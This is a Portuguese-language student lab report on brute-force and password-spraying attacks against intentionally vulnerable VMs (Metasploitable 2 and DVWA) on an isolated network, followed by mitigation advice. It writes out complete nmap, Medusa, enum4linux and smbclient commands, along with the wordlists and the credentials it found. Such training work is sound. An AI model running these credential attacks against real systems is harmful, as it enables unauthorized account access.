# 🛡️ Simulação de Força Bruta, Password Spraying e Medidas de Prevenção

Relatório e documentação técnica do laboratório prático de cibersegurança focado na simulação controlada de ataques de autenticação automatizados (**Brute Force** e **Password Spraying**) e na recomendação de medidas de mitigação.

## 📑 Identificação do Projeto

| Campo | Informação | 
| ----- | ----- | 
| **Aluno(a)** | Bernardo G. | 
| **Curso / Instituição** | Santander - Cibersegurança do Zero à Prática | 
| **Desafio / Turma** | Ataque de Força Bruta com Kali Linux e Medusa | 
| **Data de execução** | 10/11/2026 | 

## 1. 📝 Introdução

Este projeto apresenta a implementação de um laboratório controlado de cibersegurança utilizando o **Kali Linux**, a ferramenta **Medusa** e máquinas/aplicações intencionalmente vulneráveis. O objetivo principal foi observar como tentativas automatizadas de autenticação afetam serviços de rede e formulários web, validar a eficácia dos ataques de forma segura e propor medidas de mitigação eficazes.

## 2. 🎯 Objetivos

* Configurar máquinas virtuais em uma rede isolada no VirtualBox.

* Identificar serviços disponíveis no alvo e registrar as versões detectadas através de varreduras.

* Simular tentativas controladas de autenticação nos serviços **FTP** e **SMB**.

* Automatizar tentativas de autenticação no formulário web do **DVWA** (Damn Vulnerable Web Application).

* Validar os resultados, organizar evidências de acessos bem-sucedidos e recomendar controles preventivos.

## 3. 🛡️ Escopo, Autorização e Segurança

Todos os testes descritos nesta documentação foram realizados exclusivamente dentro de um ambiente de laboratório virtual isolado. Não foram efetuados nem autorizados testes contra sistemas de terceiros. As máquinas vulneráveis foram mantidas sem exposição direta à Internet ou a redes não confiáveis.

* **Máquina Alvo (Metasploitable 2):** `192.168.56.101`

* **Máquina Atacante (Kali Linux):** `192.168.56.102`

* **Rede do Laboratório:** Network Host-Only (`192.168.56.0/24`)

## 4. 💻 Ambiente Utilizado

| Componente | Especificação / Informações | 
| ----- | ----- | 
| **Computador Hospedeiro** | Windows 11 Pro – 25H2 | 
| **Virtualizador** | Oracle VM VirtualBox 6.1.36 | 
| **VM Atacante** | Kali Linux — 2026.3 (`192.168.56.102`) | 
| **VM Alvo** | Metasploitable 2 — 2.6.24-16-server (`192.168.56.101`) | 
| **Aplicação Web Alvo** | DVWA — `http://192.168.56.101/dvwa/login.php` | 
| **Modo de Rede** | Host-only (`127.0.0.1` / `192.168.56.x`) | 

### Topologia de Rede

O ambiente foi configurado no Oracle VirtualBox com duas máquinas virtuais conectadas através de uma placa de rede virtual do tipo **Host-Only**. Isso garante comunicação bidirecional entre as VMs sem expor os serviços vulneráveis à rede externa.

#### Evidência da Configuração de Rede:

evidencia_1.png

## 5. 🔍 Preparação e Reconhecimento

Nesta etapa, foram verificadas as interfaces de rede, a conectividade entre as máquinas e os serviços expostos pelo sistema alvo.

| Etapa | Comando Utilizado | Resultado / Observação | 
| ----- | ----- | ----- | 
| **Verificação de IP** | `ip a` | Kali: `192.168.56.102` / Alvo: `192.168.56.101` | 
| **Teste de Conectividade** | `ping 192.168.56.101` | Conectividade OK (`ttl=64 time=0.3ms - 0.5ms`) | 
| **Varredura de Serviços** | `nmap -sV -p 21,22,80,445 192.168.56.101` | Portas 21 (FTP), 22 (SSH), 80 (HTTP) e 445 (SMB) abertas | 

evidencia_2.png

#### Evidência do Reconhecimento (Nmap):

```
PORT    STATE SERVICE VERSION
21/tcp  open  ftp     vsftpd 2.3.4
22/tcp  open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1
80/tcp  open  http    Apache httpd 2.2.8 ((Ubuntu) DAV/2)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X
```

## 6. 📁 Wordlists Utilizadas

Para a simulação de força bruta e password spraying, foram criados arquivos de teste contendo credenciais controladas:

* **`user.txt`** (Lista de Usuários): `user`, `msfadmin`, `adminroot` *(3 entradas)*

* **`pass.txt` / `senhas_spray.txt`** (Lista de Senhas): `123456`, `password`, `qwerty`, `msfadmin` *(4 entradas)*

## 7. 🧪 Testes Realizados

### 7.1. Teste de Autenticação FTP (Brute Force)

* **Objetivo:** Avaliar no serviço FTP se a utilização de dicionários reduzidos permite identificar credenciais fracas.

* **Comando Utilizado:**

  ```
  medusa -h 192.168.56.101 -U user.txt -P pass.txt -M ftp -t 6
  ```

* **Validação:** Acesso efetuado via cliente FTP interativo com sucesso utilizando a conta encontrada (`msfadmin:msfadmin`).

  ```
  ftp 192.168.56.101
  ```

* **Evidências:**

  evidencia_3.png

  evidencia_4.png

### 7.2. Teste em Formulário Web (DVWA - Damn Vulnerable Web App)

* **URL:** `http://192.168.56.101/dvwa/login.php`

* **Nível de Segurança DVWA:** Low (Baixo)

* **Ferramentas:** Mozilla Firefox e Medusa (`http` module).

* **Comando Utilizado:**

  ```
  medusa -h 192.168.56.101 -U user.txt -P pass.txt -M http -m PAGE:"/dvwa/login.php" -m FORM:"username=^USER^&password=^PASS^&Login=Login" -m "FAIL=Login failed" -t 6
  ```

* **Resultado:** Descobertas combinações válidas de login e senha no formulário web HTTP.

* **Evidências:**

  evidencia_5.png

  evidencia_6.png

### 7.3. Enumeração e Password Spraying em SMB

* **Objetivo:** Enumerar contas válidas via Samba/SMB e simular um ataque do tipo *Password Spraying* (testar poucas senhas conhecidas contra múltiplos usuários).

* **Enumeração de Usuários (`enum4linux`):**

  ```
  enum4linux -a 192.168.56.101
  ```

  evidencia_7.png

* **Password Spraying (`Medusa`):**

  ```
  medusa -h 192.168.56.101 -U smb_user.txt -P senhas_spray.txt -M smbnt -t 2 -T 50
  ```

  evidencia_8.png

* **Validação de Acesso (`smbclient`):**

  ```
  smbclient -L //192.168.56.101 -U msfadmin
  ```

  * **Resultados Obavidos:** Listagem completa de compartilhamentos (`print$`, `tmp`, `opt`, `IPC$`, `ADMIN$`, `msfadmin`).

## 8. 📊 Resumo dos Resultados

| Cenário | Protocolo / Aplicação | Resultado | Acesso Validado? | 
| ----- | ----- | ----- | ----- | 
| **FTP** | FTP (Porta 21) | Sucesso | ✅ Sim | 
| **Web** | DVWA / HTTP (Porta 80) | Sucesso | ✅ Sim | 
| **SMB** | Samba (Porta 445) | Sucesso | ✅ Sim | 

## 9. 🛡️ Recomendações de Mitigação

| Área / Serviço | Medidas Recomendadas | 
| ----- | ----- | 
| **Serviço FTP** | Substituir por **SFTP** ou **FTPS**; desabilitar o protocolo FTP simples não criptografado; implementar controle de firewall e limitação de tentativas. | 
| **Aplicações Web** | Implementar **Rate Limiting** (bloqueio/atraso por IP/conta), uso de **MFA** (Autenticação Multi-Fator), **CAPTCHA** adaptativo e proteção contra CSRF. | 
| **Serviço SMB** | Desabilitar suporte ao **SMBv1**; manter o Samba atualizado; restringir portas 139 e 445 por segmentação de rede/firewall; aplicar políticas de senhas fortes. | 
| **Gestão de Senhas** | Exigir senhas complexas e únicas; adotar MFA obrigatoriamente; configurar alertas para múltiplas falhas de login em curto período sem gerar Negação de Serviço (*DoS*). | 
| **Monitoramento** | Centralizar logs de autenticação (SIEM); criar regras de alerta para padrões típicos de *Password Spraying* (muitas contas testadas com uma mesma senha). | 

## 10. 🎯 Conclusão

A realização deste laboratório permitiu vivenciar na prática as etapas de enumeração, análise de vulnerabilidades em serviços de autenticação e execução controlada de técnicas como **Brute Force** e **Password Spraying**.

A experiência comprovou que serviços expostos e configurados com senhas fracas ou sem limitação de tentativas são alvos fáceis para automatização de ataques. A aplicação das recomendações defensivas propostas é fundamental para elevar o nível de postura de segurança corporativa.

## 📚 Referências

* [DIO - Criando um ataque de brute force de senhas com Medusa e Kali Linux](https://web.dio.me/)

* [Nmap Network Scanning Documentation](https://nmap.org/book/)

* [Foofus Networks - Medusa Documentation](https://www.foofus.net/jmk/medusa/medusa.html)